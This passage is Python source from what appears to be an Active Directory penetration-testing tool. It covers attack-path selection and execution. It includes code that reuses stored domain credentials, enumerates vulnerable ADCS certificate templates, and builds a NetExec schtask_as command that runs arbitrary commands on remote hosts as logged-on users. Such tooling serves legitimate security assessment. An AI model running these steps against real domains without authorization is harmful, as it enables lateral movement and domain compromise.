"""Attack path execution UX helpers.

This module centralizes the interactive UX for:
- listing attack paths (already computed from `attack_graph.json`)
- letting the user inspect details
- optionally executing a selected path by mapping its steps to existing ADscan actions

The goal is to reuse this flow from multiple places (e.g. Phase 2 summary,
`ask_for_user_privs`, future phases) without duplicating prompt logic.
"""

from __future__ import annotations

from typing import Any, Callable
from contextlib import contextmanager
from datetime import UTC, datetime
import os
import re
import secrets
import shlex
import sys
import time

from rich.prompt import Confirm, Prompt
from rich.table import Table
from rich.text import Text

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_warning,
    telemetry,
)
from adscan_internal.interaction import is_non_interactive
from adscan_internal.passwords import generate_strong_password, is_password_complex
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    print_panel,
    print_attack_path_detail,
    print_attack_paths_summary,
)
from adscan_internal.services.attack_graph_service import (
    infer_directory_object_enabled_state,
    get_node_by_label,
    get_attack_path_summaries,
    get_owned_domain_usernames_for_attack_paths,
    resolve_netexec_target_for_node_label,
    resolve_group_name_by_rid,
    resolve_group_user_members,
    update_edge_status_by_labels,
)
from adscan_internal.services.attack_graph_runtime_service import (
    clear_attack_path_execution,
    set_attack_path_step_context,
    set_attack_path_execution,
)
from adscan_internal.cli.roasting_execution import (
    run_asreproast_for_user,
    run_kerberoast_for_user,
)
from adscan_internal.cli.ace_step_execution import (
    ACL_ACE_RELATIONS,
    build_ace_step_context,
    describe_ace_relation_support,
    describe_ace_step_support,
    execute_ace_step,
    get_last_ace_execution_outcome,
    resolve_execution_user as _shared_resolve_execution_user,
)
from adscan_internal.cli.attack_step_followups import (
    build_followups_for_execution_outcome,
    build_followups_for_step,
    execute_guided_followup_actions,
)
from adscan_internal.services.attack_step_support_registry import (
    CONTEXT_ONLY_RELATIONS,
    POLICY_BLOCKED_RELATIONS,
    SUPPORTED_RELATION_NOTES,
    classify_relation_support,
)


def _normalize_account(value: str) -> str:
    name = (value or "").strip()
    if "\\" in name:
        name = name.split("\\", 1)[1]
    if "@" in name:
        name = name.split("@", 1)[0]
    return name.strip().lower()


def _get_stored_domain_credential_for_user(
    shell: Any, *, domain: str, username: str
) -> str | None:
    """Return stored credential for a domain user using case-insensitive lookup."""
    normalized_target = _normalize_account(username)
    if not normalized_target:
        return None
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    credentials = domain_data.get("credentials")
    if not isinstance(credentials, dict):
        return None
    for stored_user, stored_credential in credentials.items():
        if _normalize_account(str(stored_user)) != normalized_target:
            continue
        if not isinstance(stored_credential, str):
            return None
        candidate = stored_credential.strip()
        return candidate or None
    return None


def _env_flag_enabled(name: str) -> bool:
    """Return True when an environment flag is enabled."""
    return str(os.getenv(name, "")).strip().lower() in {
        "1",
        "true",
        "yes",
        "on",
    }


def _env_int(name: str, default: int, *, minimum: int = 0) -> int:
    """Read an integer env var with fallback and floor."""
    raw = str(os.getenv(name, str(default))).strip()
    try:
        value = int(raw)
    except (TypeError, ValueError):
        value = default
    return max(minimum, value)


_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD = _env_int(
    "ADSCAN_ATTACK_PATH_AUTO_REFRESH_MAX_AFFECTED_USERS",
    150,
    minimum=0,
)

_EXECUTION_CONTEXT_ACTIONS = {
    "adminto",
    "sqladmin",
    "canrdp",
    "canpsremote",
    "allowedtodelegate",
    "adcsesc1",
    "adcsesc3",
    "adcsesc4",
    "dumplsa",
    "dumpdpapi",
    *ACL_ACE_RELATIONS,
}


def _affected_user_count(summary: dict[str, Any]) -> int:
    """Return affected-user count from summary metadata when available."""
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return 0
    count = meta.get("affected_user_count")
    if isinstance(count, int) and count >= 0:
        return count
    users = meta.get("affected_users")
    if isinstance(users, list):
        return len(users)
    return 0


def _get_stored_credential_map(shell: Any, domain: str) -> dict[str, str]:
    """Return stored domain credentials indexed by normalized username."""
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return {}
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return {}
    creds = domain_data.get("credentials")
    if not isinstance(creds, dict):
        return {}
    normalized: dict[str, str] = {}
    for username in creds.keys():
        normalized_username = _normalize_account(str(username or ""))
        if not normalized_username:
            continue
        normalized[normalized_username] = str(username)
    return normalized


def _first_credential_context_step(summary: dict[str, Any]) -> tuple[str, dict[str, Any]] | None:
    """Return the first path step that requires an execution credential context."""
    steps = summary.get("steps")
    if not isinstance(steps, list):
        return None
    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if action in _EXECUTION_CONTEXT_ACTIONS:
            details = step.get("details")
            if isinstance(details, dict):
                return action, details
    return None


def _execution_readiness_meta(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    context_username: str | None,
    context_password: str | None,
) -> dict[str, Any]:
    """Estimate whether a path has usable execution credential context."""
    step_info = _first_credential_context_step(summary)
    if step_info is None:
        return {}

    action, details = step_info
    from_label = str(details.get("from") or "")
    to_label = str(details.get("to") or "")
    stored_creds = _get_stored_credential_map(shell, domain)
    target_kind = ""
    target_enabled: bool | None = None
    target_enabled_source = "unknown"
    if action in ACL_ACE_RELATIONS and to_label:
        to_node = get_node_by_label(shell, domain, label=to_label)
        if isinstance(to_node, dict):
            kind = to_node.get("kind") or to_node.get("labels") or to_node.get("type")
            if isinstance(kind, list) and kind:
                target_kind = str(kind[0])
            elif isinstance(kind, str):
                target_kind = kind
            target_enabled, target_enabled_source = infer_directory_object_enabled_state(
                shell,
                domain=domain,
                principal_name=to_label,
                principal_kind=target_kind,
                node=to_node,
            )
        supported, support_reason = describe_ace_relation_support(action, target_kind)
        if not supported:
            return {
                "execution_context_required": True,
                "execution_support_status": "unsupported",
                "execution_support_reason": support_reason or "Unsupported target type",
                "execution_support_target_kind": target_kind or "Unknown",
                "execution_target_enabled": target_enabled,
                "execution_target_enabled_source": target_enabled_source,
                "execution_ready_count": 0,
                "execution_candidate_count": 0,
                "execution_candidate_source": "unsupported",
                "execution_readiness_reason": "unsupported_target_type",
                "execution_context_action": action,
            }

    normalized_context_user = _normalize_account(context_username or "")
    if normalized_context_user:
        ready = bool(
            context_password
            or _resolve_domain_password(shell, domain, normalized_context_user)
        )
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_ready_count": 1 if ready else 0,
            "execution_candidate_count": 1,
            "execution_candidate_source": "context_username",
            "execution_readiness_reason": (
                "context_username"
                if ready
                else "context_username_missing_credential"
            ),
            "execution_context_action": action,
        }

    normalized_from_user = _normalize_account(from_label)
    from_node = get_node_by_label(shell, domain, label=from_label) if from_label else None
    from_kind = ""
    if isinstance(from_node, dict):
        kind = from_node.get("kind") or from_node.get("labels") or from_node.get("type")
        if isinstance(kind, list) and kind:
            from_kind = str(kind[0])
        elif isinstance(kind, str):
            from_kind = kind
    if normalized_from_user and normalized_from_user in stored_creds:
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_ready_count": 1,
            "execution_candidate_count": 1,
            "execution_candidate_source": "from_label_credential",
            "execution_readiness_reason": "from_label_credential",
            "execution_context_action": action,
        }
    if normalized_from_user and from_kind.strip().lower() == "user":
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_ready_count": 0,
            "execution_candidate_count": 1,
            "execution_candidate_source": "from_label_user_node",
            "execution_readiness_reason": "from_label_missing_stored_credential",
            "execution_context_action": action,
        }

    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    affected_users = meta.get("affected_users") if isinstance(meta, dict) else None
    affected_count = _affected_user_count(summary)
    if isinstance(affected_users, list) and affected_users:
        ready_users: list[str] = []
        for raw_user in affected_users:
            if not isinstance(raw_user, str):
                continue
            normalized = _normalize_account(raw_user)
            if normalized and normalized in stored_creds:
                ready_users.append(normalized)
        ready_users = list(dict.fromkeys(ready_users))
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_ready_count": len(ready_users),
            "execution_candidate_count": affected_count or len(affected_users),
            "execution_candidate_source": "affected_users",
            "execution_readiness_reason": (
                "affected_users_intersection"
                if ready_users
                else "no_stored_credential_for_affected_users"
            ),
            "execution_context_action": action,
        }

    if stored_creds:
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_ready_count": len(stored_creds),
            "execution_candidate_count": len(stored_creds),
            "execution_candidate_source": "all_stored_credentials_fallback",
            "execution_readiness_reason": "all_stored_credentials_fallback",
            "execution_context_action": action,
        }

    return {
        "execution_context_required": True,
        "execution_support_status": "supported",
        "execution_support_target_kind": target_kind or "",
        "execution_target_enabled": target_enabled,
        "execution_target_enabled_source": target_enabled_source,
        "execution_ready_count": 0,
        "execution_candidate_count": 0,
        "execution_candidate_source": "unresolved",
        "execution_readiness_reason": "no_stored_credentials_available",
        "execution_context_action": action,
    }


def _annotate_execution_readiness(
    shell: Any,
    *,
    domain: str,
    summaries: list[dict[str, Any]],
    context_username: str | None,
    context_password: str | None,
) -> list[dict[str, Any]]:
    """Attach execution readiness metadata used by the attack-path UX."""
    annotated: list[dict[str, Any]] = []
    for summary in summaries:
        current = dict(summary)
        meta = current.get("meta")
        if not isinstance(meta, dict):
            meta = {}
            current["meta"] = meta
        else:
            meta = dict(meta)
            current["meta"] = meta
        readiness = _execution_readiness_meta(
            shell,
            domain=domain,
            summary=current,
            context_username=context_username,
            context_password=context_password,
        )
        if readiness:
            meta.update(readiness)
        annotated.append(current)
    return annotated


def _path_has_ready_execution_context(summary: dict[str, Any]) -> bool:
    """Return True when a path has usable execution context or does not require it."""
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return True
    if not meta.get("execution_context_required"):
        return True
    ready_count = meta.get("execution_ready_count")
    return isinstance(ready_count, int) and ready_count > 0


def _path_is_supported_for_execution(summary: dict[str, Any]) -> bool:
    """Return False when the path is pre-identified as unsupported."""
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return True
    return str(meta.get("execution_support_status") or "").strip().lower() != "unsupported"


def _path_is_actionable_for_execution_prompt(
    summary: dict[str, Any],
    *,
    desired_statuses: set[str] | None,
) -> bool:
    """Return True when a path is worth re-prompting for execution."""
    status = str(summary.get("status") or "theoretical").strip().lower()
    if desired_statuses is not None and not _status_allowed_by_filter(
        status, desired_statuses
    ):
        return False
    if status not in {"theoretical", "attempted"}:
        return False
    if not _path_is_supported_for_execution(summary):
        return False
    if not _path_has_ready_execution_context(summary):
        return False
    return True


def _summarize_non_actionable_paths(
    summaries: list[dict[str, Any]],
    *,
    desired_statuses: set[str] | None,
) -> tuple[int, dict[str, int]]:
    """Return count and reason buckets for non-actionable path summaries."""
    reasons = {
        "exploited": 0,
        "blocked": 0,
        "unsupported": 0,
        "unavailable": 0,
        "needs_context": 0,
        "status_filtered": 0,
        "other": 0,
    }
    for summary in summaries:
        status = str(summary.get("status") or "theoretical").strip().lower()
        if desired_statuses is not None and not _status_allowed_by_filter(
            status, desired_statuses
        ):
            reasons["status_filtered"] += 1
            continue
        if status == "exploited":
            reasons["exploited"] += 1
            continue
        if status == "blocked":
            reasons["blocked"] += 1
            continue
        if status == "unsupported":
            reasons["unsupported"] += 1
            continue
        if status == "unavailable":
            reasons["unavailable"] += 1
            continue
        if not _path_is_supported_for_execution(summary):
            reasons["unsupported"] += 1
            continue
        if not _path_has_ready_execution_context(summary):
            reasons["needs_context"] += 1
            continue
        reasons["other"] += 1
    return sum(reasons.values()), reasons


def _format_non_actionable_reason_summary(reasons: dict[str, int]) -> str:
    """Return a compact visible breakdown of non-actionable path reasons."""
    parts: list[str] = []
    labels = (
        ("exploited", "exploited"),
        ("blocked", "blocked"),
        ("unsupported", "unsupported"),
        ("unavailable", "unavailable"),
        ("needs_context", "needs_context"),
        ("status_filtered", "filtered"),
        ("other", "other"),
    )
    for key, label in labels:
        count = int(reasons.get(key, 0) or 0)
        if count > 0:
            parts.append(f"{label}={count}")
    return ", ".join(parts) if parts else "none"


def _choose_custom_attack_path_start_step(
    shell: Any,
    *,
    steps: list[dict[str, Any]],
    executable_indices: list[int],
    default_step_idx: int,
) -> int | None:
    """Let the operator choose a custom executable step index."""
    if not hasattr(shell, "_questionary_select"):
        return default_step_idx

    options: list[str] = []
    default_option_idx = 0
    for option_idx, step_idx in enumerate(executable_indices):
        step_item = steps[step_idx - 1] if step_idx - 1 < len(steps) else {}
        action = str(step_item.get("action") or "N/A").strip() or "N/A"
        status = str(step_item.get("status") or "discovered").strip().lower()
        from_label = (
            str(
                (step_item.get("details") or {}).get("from")
                if isinstance(step_item.get("details"), dict)
                else ""
            ).strip()
            or "?"
        )
        to_label = (
            str(
                (step_item.get("details") or {}).get("to")
                if isinstance(step_item.get("details"), dict)
                else ""
            ).strip()
            or "?"
        )
        options.append(
            f"Step #{step_idx}: {action} [{status}] {from_label} -> {to_label}"
        )
        if step_idx == default_step_idx:
            default_option_idx = option_idx
    options.append("Cancel execution")

    selection = shell._questionary_select(
        "Choose a custom start step:",
        options,
        default_idx=default_option_idx,
    )
    if selection is None:
        return None
    if selection >= len(executable_indices):
        return None
    return executable_indices[selection]


def _resolve_attack_path_start_step(
    shell: Any,
    *,
    steps: list[dict[str, Any]],
    executable_indices: list[int],
    non_executable_actions: set[str],
    dangerous_actions: set[str],
) -> int | None:
    """Return selected start step index for attack path execution."""
    if not executable_indices:
        return None

    first_executable_idx = executable_indices[0]
    rerun_success_steps = _env_flag_enabled("ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS")
    if rerun_success_steps:
        print_info_verbose(
            "ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS enabled: re-running from step #1."
        )
        return first_executable_idx

    first_pending_idx: int | None = None
    completed_steps = 0
    for step_idx, step_item in enumerate(steps, start=1):
        if not isinstance(step_item, dict):
            continue
        step_action = str(step_item.get("action") or "").strip().lower()
        if step_action in non_executable_actions:
            continue
        if step_action in dangerous_actions:
            continue
        step_status = str(step_item.get("status") or "discovered").strip().lower()
        if step_status == "success":
            completed_steps += 1
            continue
        first_pending_idx = step_idx
        break

    default_start_idx = first_pending_idx or first_executable_idx
    non_interactive = is_non_interactive(shell)

    # If no pending steps, default to not re-execute unless explicitly requested.
    if first_pending_idx is None:
        if non_interactive:
            return None
        if not hasattr(shell, "_questionary_select"):
            print_info(
                "All executable steps in this attack path are already marked as success."
            )
            print_info_verbose(
                "Set ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS=1 to force re-execution "
                "from the first step."
            )
            return None

        options = [
            "Skip execution (Recommended)",
            f"Re-run from step #{first_executable_idx}",
            "Choose custom start step",
        ]
        choice = shell._questionary_select(
            "All executable steps are already successful. What do you want to do?",
            options,
            default_idx=0,
        )
        if choice is None or choice == 0:
            return None
        if choice == 1:
            return first_executable_idx
        if choice == 2:
            return _choose_custom_attack_path_start_step(
                shell,
                steps=steps,
                executable_indices=executable_indices,
                default_step_idx=first_executable_idx,
            )
        return None

    if completed_steps <= 0:
        return default_start_idx
    if non_interactive:
        return default_start_idx

    if not hasattr(shell, "_questionary_select"):
        print_info(
            f"Resuming from step #{default_start_idx} (first non-success step)."
        )
        print_info_verbose(
            f"Skipping {completed_steps} previously successful step(s)."
        )
        return default_start_idx

    options = [
        f"Resume from step #{default_start_idx} (Recommended)",
        f"Re-run from step #{first_executable_idx}",
        "Choose custom start step",
        "Cancel execution",
    ]
    choice = shell._questionary_select(
        "This path is partially executed. Choose how to continue:",
        options,
        default_idx=0,
    )
    if choice is None or choice >= len(options) - 1:
        return None
    if choice == 0:
        print_info(
            f"Resuming from step #{default_start_idx} (first non-success step)."
        )
        return default_start_idx
    if choice == 1:
        return first_executable_idx
    if choice == 2:
        return _choose_custom_attack_path_start_step(
            shell,
            steps=steps,
            executable_indices=executable_indices,
            default_step_idx=default_start_idx,
        )
    return None


def _extract_cert_template_name_from_label(
    *,
    domain: str,
    to_label: str | None,
) -> str | None:
    """Best-effort extraction of a certificate template name from a step target label."""
    raw = str(to_label or "").strip()
    if not raw:
        return None
    if raw.strip().lower() == str(domain or "").strip().lower():
        return None
    if "\\" in raw:
        raw = raw.split("\\", 1)[1].strip()
    if "@" in raw:
        left, _, right = raw.partition("@")
        if right and right.strip().lower() == str(domain or "").strip().lower():
            raw = left.strip()
    return raw.strip() or None


def _extract_cert_templates_from_step_details(
    details: dict[str, Any],
) -> list[str]:
    """Extract certificate template names from attack-step details."""

    templates: list[str] = []

    template_name = details.get("template")
    if isinstance(template_name, str) and template_name.strip():
        templates.append(template_name.strip())

    raw_templates = details.get("templates")
    if isinstance(raw_templates, list):
        for entry in raw_templates:
            name = None
            if isinstance(entry, dict):
                name = entry.get("name") or entry.get("template")
            elif isinstance(entry, str):
                name = entry
            if isinstance(name, str) and name.strip():
                templates.append(name.strip())

    summary = details.get("templates_summary")
    if isinstance(summary, str) and summary.strip() and not raw_templates:
        for item in summary.split(","):
            candidate = item.strip()
            if not candidate or candidate.startswith("+"):
                continue
            if "(" in candidate:
                candidate = candidate.split("(", 1)[0].strip()
            if candidate:
                templates.append(candidate)

    if not templates:
        return []

    unique = sorted(
        {t for t in templates if isinstance(t, str) and t.strip()}, key=str.lower
    )
    return unique


def _status_allowed_by_filter(status: str, desired_statuses: set[str] | None) -> bool:
    """Return True when status passes the optional execution filter."""
    if desired_statuses is None:
        return True
    return status in desired_statuses


def _select_adcs_template(
    shell: Any,
    *,
    esc_number: str,
    templates: list[str],
    default_idx: int = 0,
) -> str | None:
    """Select a certificate template from candidates (prompt if needed)."""

    if not templates:
        return None

    template = templates[0]
    if len(templates) > 1 and hasattr(shell, "_questionary_select"):
        options = list(templates) + ["Cancel"]
        idx = shell._questionary_select(
            f"Select an ESC{esc_number} template to use:",
            options,
            default_idx=default_idx,
        )
        if idx is None or idx >= len(options) - 1:
            return None
        template = templates[idx]
    return template


def _resolve_adcs_template_candidates(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    password: str,
    esc_number: str,
    details: dict[str, Any],
    to_label: str | None,
    domain_data: dict[str, Any],
    allow_object_control: bool = False,
) -> list[str]:
    """Resolve certificate templates for an ADCS ESC step."""

    esc_tag = str(esc_number).strip()
    esc_templates = _extract_cert_templates_from_step_details(details)
    if esc_templates:
        marked = ", ".join(mark_sensitive(t, "service") for t in esc_templates)
        print_info_debug(
            f"[adcsesc{esc_tag}] Using certificate template(s) from attack step details: "
            f"{marked}"
        )
        return esc_templates

    template_from_step = _extract_cert_template_name_from_label(
        domain=domain,
        to_label=to_label,
    )
    if template_from_step:
        print_info_debug(
            f"[adcsesc{esc_tag}] Using certificate template from attack step target: "
            f"{mark_sensitive(template_from_step, 'service')}"
        )
        return [template_from_step]

    if allow_object_control:
        try:
            from adscan_internal.services.attack_graph_service import (
                resolve_certipy_esc4_templates_for_principal,
            )

            esc_templates = resolve_certipy_esc4_templates_for_principal(
                shell,
                domain=domain,
                principal_samaccountname=exec_username,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            esc_templates = []
        if esc_templates:
            return esc_templates

    try:
        from adscan_internal.services.exploitation import ExploitationService

        pdc_hostname = domain_data.get("pdc_hostname")
        target_host = None
        if isinstance(pdc_hostname, str) and pdc_hostname.strip():
            target_host = (
                pdc_hostname if "." in pdc_hostname else f"{pdc_hostname}.{domain}"
            )
        auth = shell.build_auth_certipy(domain, exec_username, password)
        output_prefix = None
        domain_dir = domain_data.get("dir")
        if isinstance(domain_dir, str) and domain_dir:
            adcs_dir = os.path.join(domain_dir, "adcs")
            os.makedirs(adcs_dir, exist_ok=True)
            if allow_object_control:
                safe_user = re.sub(r"[^a-zA-Z0-9_.-]+", "_", exec_username)
                output_prefix = os.path.join(adcs_dir, f"certipy_find_{safe_user}")
            else:
                output_prefix = os.path.join(adcs_dir, "certipy_find")
        service = ExploitationService()
        result = service.adcs.enum_privileges(
            certipy_path=shell.certipy_path,
            pdc_ip=domain_data["pdc"],
            target_host=target_host,
            auth_string=auth,
            output_prefix=output_prefix,
            timeout=300,
            run_command=getattr(shell, "run_command", None),
            vulnerable_only=bool(allow_object_control),
            use_cached_json=not allow_object_control,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning(
            f"Failed to enumerate ADCS templates for ESC{mark_sensitive(esc_tag, 'service')}."
        )
        return []

    if not getattr(result, "success", False):
        print_warning(
            "ADCS privilege enumeration failed; cannot select "
            f"ESC{mark_sensitive(esc_tag, 'service')} template."
        )
        return []

    esc_templates = [
        v.template
        for v in getattr(result, "vulnerabilities", [])
        if getattr(v, "esc_number", None) == esc_tag and getattr(v, "template", None)
    ]
    esc_templates = [t for t in esc_templates if isinstance(t, str) and t.strip()]
    return sorted(set(esc_templates), key=str.lower)


def _prompt_for_manual_adcs_template(
    *,
    esc_number: str,
    default: str | None = None,
) -> str | None:
    """Prompt the operator for a manual certificate template name."""

    if os.getenv("CI") or not sys.stdin.isatty() or not sys.stdout.isatty():
        return None

    prompt_default = default or ""
    try:
        response = Prompt.ask(
            f"Enter an ESC{esc_number} certificate template name (blank to cancel)",
            default=prompt_default,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        return None

    if not isinstance(response, str):
        return None
    response = response.strip()
    return response or None


def _resolve_execution_user(
    shell: Any,
    *,
    domain: str,
    context_username: str | None,
    summary: dict[str, object],
    from_label: str | None,
    max_options: int = 20,
) -> str | None:
    """Resolve an execution user for attack steps that require credentials."""
    return _shared_resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
        max_options=max_options,
    )


def _resolve_golden_cert_execution_user(
    shell: Any,
    *,
    domain: str,
    context_username: str | None,
    summary: dict[str, object],
    from_label: str | None,
) -> str | None:
    """Resolve execution user for GoldenCert, preferring CA machine account creds."""
    domains_data = getattr(shell, "domains_data", None)
    domain_data = (
        domains_data.get(domain)
        if isinstance(domains_data, dict) and isinstance(domains_data.get(domain), dict)
        else {}
    )
    creds = domain_data.get("credentials") if isinstance(domain_data, dict) else {}
    if isinstance(creds, dict) and creds:
        from_user = _normalize_account(from_label or "")
        cred_keys = {str(k).lower(): str(k) for k in creds.keys()}
        if from_user.endswith("$") and from_user in cred_keys:
            selected = cred_keys[from_user]
            print_info_debug(
                "[goldencert] Using CA machine credential from step source: "
                f"{mark_sensitive(selected, 'user')}"
            )
            return selected

    return _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )


def _resolve_golden_cert_target_host(
    shell: Any,
    *,
    domain: str,
    from_label: str | None,
    domain_data: dict[str, Any],
) -> str | None:
    """Resolve target CA host for GoldenCert."""
    if from_label:
        resolved = resolve_netexec_target_for_node_label(
            shell,
            domain,
            node_label=from_label,
        )
        if isinstance(resolved, str) and resolved.strip():
            return resolved.strip()

    adcs_host = domain_data.get("adcs")
    if isinstance(adcs_host, str) and adcs_host.strip():
        return adcs_host.strip()

    pdc_host = domain_data.get("pdc_hostname")
    if isinstance(pdc_host, str) and pdc_host.strip():
        return pdc_host.strip()
    return None


def _sorted_paths(paths: list[dict[str, Any]]) -> list[dict[str, Any]]:
    status_order = {
        "theoretical": 0,
        "unavailable": 1,
        "unsupported": 2,
        "blocked": 3,
        "attempted": 4,
        "exploited": 5,
    }

    return sorted(
        paths,
        key=lambda item: (
            status_order.get(str(item.get("status") or "").strip().lower(), 3),
            int(item.get("length", 0)) if str(item.get("length", "")).isdigit() else 0,
            str(item.get("source", "")).lower(),
            str(item.get("target", "")).lower(),
        ),
    )


def _find_first_step(summary: dict[str, Any], *, action: str) -> dict[str, Any] | None:
    steps = summary.get("steps")
    if not isinstance(steps, list):
        return None
    needle = (action or "").strip().lower()
    for step in steps:
        if not isinstance(step, dict):
            continue
        if str(step.get("action") or "").strip().lower() != needle:
            continue
        return step
    return None


def _resolve_domain_password(shell: object, domain: str, username: str) -> str | None:
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return None
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return None
    creds = domain_data.get("credentials")
    if not isinstance(creds, dict):
        return None
    value = creds.get(username)
    if not isinstance(value, str) or not value:
        return None
    return value


def _sanitize_filename_token(value: str, *, fallback: str) -> str:
    """Return a filesystem-safe token for log file names."""
    token = re.sub(r"[^a-zA-Z0-9_.-]+", "_", str(value or "").strip())
    token = token.strip("._")
    return token or fallback


def _is_valid_domain_username(value: str, *, allow_machine: bool = False) -> bool:
    """Validate a candidate domain username/sAMAccountName."""
    candidate = str(value or "").strip()
    if not candidate:
        return False
    if len(candidate) > 20:
        return False
    if allow_machine and candidate.endswith("$"):
        candidate = candidate[:-1]
    if not candidate:
        return False
    return bool(re.fullmatch(r"[A-Za-z0-9._-]+", candidate))


def _generate_default_hassession_username() -> str:
    """Generate a short default domain username for HasSession escalation."""
    stamp = datetime.now(UTC).strftime("%m%d%H%M")
    suffix = f"{secrets.randbelow(100):02d}"
    return f"adscan{stamp}{suffix}"[:20]


def _generate_strong_password(length: int = 12) -> str:
    """Backward-compatible wrapper around centralized password generation."""
    return generate_strong_password(length)


def _is_password_complex(value: str) -> bool:
    """Backward-compatible wrapper around centralized password validation."""
    return is_password_complex(value)


def _run_netexec_for_domain(
    shell: Any,
    *,
    domain: str,
    command: str,
    timeout: int = 300,
) -> Any:
    """Run a NetExec command with domain-aware retry/sync when available."""
    netexec_runner = getattr(shell, "_run_netexec", None)
    if callable(netexec_runner):
        return netexec_runner(command, domain=domain, timeout=timeout)
    return shell.run_command(command, timeout=timeout)


def _run_hassession_schtask_command(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    exec_password: str,
    target_host: str,
    session_user: str,
    command_to_run: str,
    log_suffix: str,
) -> tuple[bool, str]:
    """Execute NetExec `schtask_as` for HasSession abuse on a target host."""
    marked_host = mark_sensitive(target_host, "hostname")
    marked_exec_user = mark_sensitive(exec_username, "user")
    marked_session_user = mark_sensitive(session_user, "user")
    print_info_debug(
        "[hassession] Running schtask_as on "
        f"{marked_host} as session user {marked_session_user} "
        f"(executor: {marked_exec_user})."
    )
    auth = shell.build_auth_nxc(exec_username, exec_password, domain, kerberos=False)
    safe_host = _sanitize_filename_token(target_host, fallback="target")
    safe_exec_user = _sanitize_filename_token(exec_username, fallback="executor")
    safe_suffix = _sanitize_filename_token(log_suffix, fallback="command")
    log_path = (
        f"domains/{domain}/smb/"
        f"hassession_{safe_suffix}_{safe_exec_user}_{safe_host}.log"
    )
    module_command = (
        f"{shell.netexec_path} smb {shlex.quote(target_host)} {auth} "
        f"-t 1 --timeout 60 --smb-timeout 10 "
        f"-M schtask_as "
        f"-o CMD={shlex.quote(command_to_run)} USER={shlex.quote(session_user)} "
        f"--log {shlex.quote(log_path)}"
    )
    result = _run_netexec_for_domain(
        shell,
        domain=domain,
        command=module_command,
        timeout=300,
    )
    if result is None:
        return False, ""
    stdout = str(getattr(result, "stdout", "") or "")
    stderr = str(getattr(result, "stderr", "") or "")
    output = "\n".join(part for part in (stdout, stderr) if part)
    return bool(getattr(result, "returncode", 1) == 0), output


def _resolve_exec_password_for_user(
    shell: Any,
    *,
    domain: str,
    username: str,
    context_username: str | None,
    context_password: str | None,
) -> str | None:
    """Resolve the password/hash for ``username`` without mismatching context creds."""
    if not username:
        return None
    context_user = _normalize_account(context_username or "")
    if context_password and context_user and username.lower() == context_user.lower():
        return context_password
    return _resolve_domain_password(shell, domain, username)


def _resolve_hassession_host_and_user(
    shell: Any,
    *,
    domain: str,
    from_label: str,
    to_label: str,
) -> tuple[str | None, str | None]:
    """Resolve HasSession host and logged-on user from path labels."""
    from_target = resolve_netexec_target_for_node_label(
        shell, domain, node_label=from_label
    )
    to_target = resolve_netexec_target_for_node_label(shell, domain, node_label=to_label)
    from_user = _normalize_account(from_label)
    to_user = _normalize_account(to_label)

    if isinstance(from_target, str) and from_target.strip():
        host = from_target.strip()
        return host, to_user or from_user or None
    if isinstance(to_target, str) and to_target.strip():
        host = to_target.strip()
        return host, from_user or to_user or None
    return None, to_user or from_user or None


def _extract_group_name_from_label(value: str) -> str:
    """Extract group name from canonical labels like ``GROUP@DOMAIN``."""
    raw = str(value or "").strip()
    if not raw:
        return ""
    if "@" in raw:
        raw = raw.split("@", 1)[0].strip()
    return raw


def _resolve_users_from_principal_label(
    shell: Any,
    *,
    domain: str,
    principal_label: str,
) -> list[str]:
    """Resolve candidate users from a principal label (user or group)."""
    normalized_user = _normalize_account(principal_label)
    if _is_valid_domain_username(normalized_user):
        return [normalized_user]

    group_name = _extract_group_name_from_label(principal_label)
    if not group_name:
        return []
    members = resolve_group_user_members(
        shell,
        domain,
        group_name,
        enabled_only=True,
        max_results=500,
    )
    if members is None:
        return []
    valid_members = [
        user
        for user in members
        if _is_valid_domain_username(user) and not str(user).endswith("$")
    ]
    return sorted(set(valid_members), key=str.lower)


def _collect_previous_host_access_candidates(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
